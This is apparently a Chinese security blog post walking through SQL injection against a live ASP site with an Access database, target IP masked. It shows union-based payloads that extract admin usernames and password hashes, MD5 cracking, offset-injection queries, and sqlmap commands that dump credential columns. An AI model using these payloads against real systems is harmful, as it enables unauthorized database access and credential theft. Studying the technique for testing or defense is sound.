> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg5NTU2NjA1Mw==&mid=2247503212&idx=1&sn=88f281f0ad37bbdd263bf1727f31e624

#  【攻防实战】实战中的Access注入  
原创 平凡安全  平凡安全   2025-06-21 12:00  
  
**「本是凡人成佛，何惧再做凡人」**  
## 「0.实战中的Access注入」  
  
访问漏洞url:  

```
http://xxx.xxx.xxx.xxx/index.asp?id=31

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQrExo89yLmFg3BL1wSfiaX4QGWRVMXrxib3lXb7ZndGXryiaqALSAXLXAw/640?wx_fmt=png&from=appmsg "")  
## 「1.Access联合查询」  
### 「判断是否有注入」  
  
and 1=1正常，and 1=2出错  

```
http://xxx.xxx.xxx.xxx/index.asp?id=31%20and%201=2

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQia8dFgh1AFG04QiaptgFgOaRric64M1Bo1ibIrpsKnAbGaybUWXRn2FnIg/640?wx_fmt=png&from=appmsg "")  
### 「判断字段数」  

```
order by 7

```

  
正常  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQqHpjOuD7mKPicpTDTcL7eNoeQWt3icSccJ7mtkxzGltSMzaC5icJNbLgA/640?wx_fmt=png&from=appmsg "")  

```
order by 8

```

  
出错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQiafHqu3f7NrsUiciahWxiaRkJzWiadLztNkjmI68vTaibYOQU4nRxWiaUn3jg/640?wx_fmt=png&from=appmsg "")  
### 「爆破出表名」  
  
爆破出表名并判断回显点为2，5  

```
http://xxx.xxx.xxx.xxx/index.asp?id=31 union select 1,2,3,4,5,6,7 from admin_user

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQCQ5YsAfjy6OhiahicTCAGP0SxStLgmc1ibZY1IZEZbcdsRbHMyEB8eicIg/640?wx_fmt=png&from=appmsg "")  
### 「查看字段内容」  
  
将字段名填入回显点  

```
http://xxx.xxx.xxx.xxx/index.asp?id=31 union select 1,admin,3,4,password,6,7 from admin_user

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQXORhJFqdK8AxzNhljcTUNu2Yz14anQ5gV5ibDX7kP19Dv0M08NFMD4A/640?wx_fmt=png&from=appmsg "")  
### 「MD5解密」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQAlOiacqnfE1T2J71QMVkY3dmVeJsiaZ1nTzV3aDgIWiagFy7ibgdnGfaYg/640?wx_fmt=png&from=appmsg "")  
## 「2.Access偏移注入」  
  
按上面的步骤判断出表名和字段数之后开始使用偏移注入  
- **「偏移注入的基本公式」**  
：  
  
- **「联合查询所要补充的字段数 = 当前字段数量 - 目标表的字段数 x N（N=1,2...）」**  
【注意：“联合查询所要补充的字段数” 指的是union关键字后面的select查询所需补充的字段数】  
  
- 在此处即为：联合查询补充字段数 = 当前字段数量（22） - admin表的字段数（6） x N  
  
- 当N=1时我们称为 “1级偏移注入”，当N=2时我们称为 “2级偏移注入”；当N=3时我们称为 “3级偏移注入”，...  
  

```
偏移量就是逐步增加或递减，直到出现结果。*表示可代替的字符串，用*代替7，返回界面依旧报错，然后用*代替6，依次递减。7-2=5，5表示admin_user表中的列名个数。
```

  

```
http://xxx.xxx.xxx.xxx/index.asp?id=31 union select 1,2,* from admin_user

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQKBYVr70a4ecdgnbJNpOxMEnG2xsbnibzSMJLnTUlDibBEkuZ1Lib0ibclg/640?wx_fmt=png&from=appmsg "")  
  
7-3=4，4表示admin_user_count表中的列名个数。  

```
http://xxx.xxx.xxx.xxx/index.asp?id=31 union select 1,2,3,* from admin_user_count

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQGbsgdSy6usxUl0LEsBeg8iarP9yvVpEsXO1A2Aqj0tSjG4VdcfozRvA/640?wx_fmt=png&from=appmsg "")  
## 「3.sqlmap工具注入」  

```
sqlmap.py -u http://x/index.asp?id=31 --tables --batch

```

### 「注入信息检测」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQkJHZlJyOSCribgaGFjU9vPoG5vboKUiaorrmgsWBddeibkgx8plhXbf3g/640?wx_fmt=png&from=appmsg "")  
### 「注入出表名」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQmvE15T1BfdqszlK33iaPjCibs2ymIDyWLib6PgAO1DDXpicNRWH9qquSrA/640?wx_fmt=png&from=appmsg "")  

```
sqlmap.py -u http://x/index.asp?id=31 -T x --columns --batch

```

### 「注入出字段名」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQ2acJRPywicQfyHictPlyjJ4P9Irvgr3DQbVs6LicP4fQflBXp8l3RpGkA/640?wx_fmt=png&from=appmsg "")  

```
sqlmap.py -u http://x/index.asp?id=31 -T x -C &#34;admin,password&#34; --dump --batch

```

### 「注入出字段的内容」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQ31D3oZa7mg1R0QibqYicYTG4vNdxI8BKyCjMJKw0cZMvmyClAKRRjhSg/640?wx_fmt=png&from=appmsg "")  
## 「攻防交流群」  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpwncLrt9icuCc6nPgiavglZXQ5ueJnnLaCFkcKibjvkL4KIxGszUFOO3KRmyXcfZlpibkWd25evIyuiaHg/640?wx_fmt=jpeg&from=appmsg "")  
## 「声明」  
  
文笔生疏，措辞浅薄，敬请各位大佬不吝赐教，万分感谢。  
  
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。  
  
转载声明：平凡安全 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。  
  
